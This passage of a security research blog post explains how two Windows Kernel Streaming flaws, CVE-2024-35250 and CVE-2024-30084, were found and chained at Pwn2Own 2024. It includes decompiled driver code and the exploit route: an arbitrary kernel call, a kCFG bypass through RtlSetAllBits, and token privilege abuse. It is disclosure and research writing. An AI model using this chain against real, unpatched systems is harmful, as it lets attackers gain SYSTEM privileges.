&lt;p&gt;When calling IOCTL, as shown in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;step 2&lt;/code&gt; of the diagram, the I/O Manager will set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode(1)&lt;/code&gt;. Until step 6, it will check if the requested property by the user exists in the KS object. If the property exists in the KS object and is set with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt;,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt; will be used to handle the specified property.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, in step 7, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; will be used to perform the IOCTL again. At this point, the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; will become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt;, and the subsequent processing will be the same as a typical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt;. This part will not be elaborated further.&lt;/p&gt;

&lt;p&gt;As a result, we now have a primitive that allows us to perform arbitrary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; operations. Next, we need to look for places where it might be possible to achieve EoP (Elevation of Privilege).&lt;/p&gt;

&lt;h3 id=&quot;the-eop&quot;&gt;The EoP&lt;/h3&gt;
&lt;p&gt;The first thing you will likely notice is the entry point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Letâ€™s take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSThunkDevice::DispatchIoctl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DispatchIoctl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CKernelFilterDevice&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IoIs32bitProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;//Convert 32-bit requests to 64-bit requests&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_KS_PROPERTY&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----[4];&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt; will first determine whether the request is from a WoW64 Process. If it is, it will convert the original 32-bit Requests into 64-bit at [3]. If the original request is already 64-bit, it will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSThunkDevice::CheckIrpForStackAdjustmentNative&lt;/code&gt; at [4] to pass it down.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Id&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;//-----[5]   &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------[6]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0000010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// call Type3InputBuffer+0x38&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------------[7]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can notice that if we give the property set as &lt;a href=&quot;https://learn.microsoft.com/mt-mt/windows-hardware/drivers/audio/kspropsetid-drmaudiostream&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt;&lt;/a&gt;, there is additional processing at [5]. At [6], we can see that it first checks whether &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt;. If it is called from user, it will directly return an error.&lt;/p&gt;

&lt;p&gt;It should be pretty obvious here that if we call IOCTL with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; and specify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; property, it will be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt; here. Additionally, it will directly use the input provided by the user as a function call at [7]. Even the first parameter is controllable.&lt;/p&gt;

&lt;p&gt;After writing the PoC, we confirmed our results.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Some people might wonder, under what device or situation would have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt;? Actually, most audio devices will have it, primarily used for setting DRM-related content.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;Once arbitrary calls are achieved, accomplishing EoP is not too difficult. Although protections such as kCFG, kASLR, and SMEP will be encountered, the only protection that needs to be dealt with under Medium IL is kCFG.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;kCFG&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;kASLR
    &lt;ul&gt;
      &lt;li&gt;NtQuerySystemInformation&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SMEP
    &lt;ul&gt;
      &lt;li&gt;Reuse Kernel Code&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;bypass-kcfg&quot;&gt;Bypass kCFG&lt;/h4&gt;
&lt;p&gt;Our goal here is straightforward: to create an arbitrary write primitive from a legitimate function, which can then be used to achieve EoP through typical methods like &lt;a href=&quot;https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#id-1.-replacing-tokens-for-privilege-escalation&quot;&gt;replacing the current process token with system token&lt;/a&gt; or &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;abusing the token privilege&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It is intuitive to look directly for legitimate functions with names containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set&lt;/code&gt;, as they are more likely to do arbitrary writing.  We directly take the export functions from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt; to see if there are any good gadgets, as these functions are generally legitimate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We quickly found &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlsetallbits&quot;&gt;RtlSetAllBits&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is a very useful gadget and a legitimate function in kCFG. Additionally, it only requires controlling the first parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_RTL_BITMAP&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BITMAP&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SizeOfBitMap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                   
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can assign the buffer to any address and specify the size, allowing us to set up a range of bits entirely. At this point, we are almost done. As long as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Token-&amp;gt;Privilege&lt;/code&gt; is fully set up, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Abuse Privilege&lt;/code&gt; method to achieve EoP.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/j1wzwXLxdVs?si=aKURBnYWXvbAaXin&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;However, before the Pwn2Own event, we created a new Windows 11 23H2 VM on Hyper-V and ran the exploit. The result was a failure. It failed at the open device stage.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After investigation, we discovered that Hyper-V does not have an audio device by default, causing the exploit to fail.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Hyper-V, only MSKSSRV is present by default. However, MSKSSRV does not have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; property, which prevents us from successfully exploiting this EoP vulnerability. Therefore, we must find other ways to trigger it or discover new vulnerabilities. We decided to review the entire process again to see if there were any other exploitable vulnerabilities.&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-30084&quot;&gt;CVE-2024-30084&lt;/h3&gt;
&lt;p&gt;After re-examining, it was found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; uses &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o&quot;&gt;Neither I/O&lt;/a&gt; to transmit data, which means it uses the input buffer for data processing directly. Generally speaking, this method is not recommended as it often leads to &lt;strong&gt;double fetch&lt;/strong&gt; issues.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the above figure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KspPropertyHandler&lt;/code&gt;, we can see that after the user calls IOCTL, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type3InputBuffer&lt;/code&gt; is directly copied into a newly allocated buffer, containing the &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;KSPROPERTY&lt;/a&gt; structure. This GUID in the structure is then used to check if the property set exists in the device. If it does, it will proceed to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Letâ€™s take another look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It &lt;strong&gt;once again copies the user-provided data from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type3InputBuffer&lt;/code&gt;&lt;/strong&gt; as the input for the new IOCTL. Clearly, there exists a &lt;strong&gt;double fetch&lt;/strong&gt; vulnerability here, so we have modified the entire process, as shown in the following diagram.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we initially send &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt;, we use the existing property  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; of MSKSSRV for subsequent operations. As shown in step 6 of the diagram, a copy of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY&lt;/code&gt; is first made into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SystemBuffer&lt;/code&gt;, and then this property is used to check whether it is in the support list of the KS object. Since MSKSSRV supports it, it will then call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;, due to the double fetch vulnerability, we can change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; between the check and use phases. Subsequently, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; will be used as the request to send IOCTL, thereby triggering the CVE-2024-35250 mentioned above logic flaw. This makes the vulnerability exploitable in any environment.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/xNUj_XZ9LhQ?si=ONmvl9_8BV-z0idL&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;Finally, we successfully compromised Microsoft Windows 11 during Pwn2Own Vancouver 2024.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the Pwn2Own event, our investigation revealed that this vulnerability has existed since Windows 7 for nearly 20 years. Moreover, it is highly reliable and has a 100% success rate in exploitation. We strongly recommend that everyone update to the latest version as soon as possible.&lt;/p&gt;

&lt;h2 id=&quot;to-be-continued&quot;&gt;To be continued&lt;/h2&gt;
&lt;p&gt;This article focuses on how we identified the vulnerabilities used in this yearâ€™s Pwn2Own and the attack surface analysis of Kernel Streaming. After discovering this vulnerability, we continued our research on this attack surface and found another exploitable vulnerability along with other interesting findings.&lt;/p&gt;

&lt;p&gt;Stay tuned for Part II, expected to be published in October of this year.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;Critically Close to Zero-Day: Exploiting Microsoft Kernel Streaming Service&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Windows Kernel Security - A Deep Dive into Two Exploits Demonstrated at Pwn2Own&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;CVE-2023-29360 Analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could/&quot;&gt;Racing Round and Round: The Little Bug That Could&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
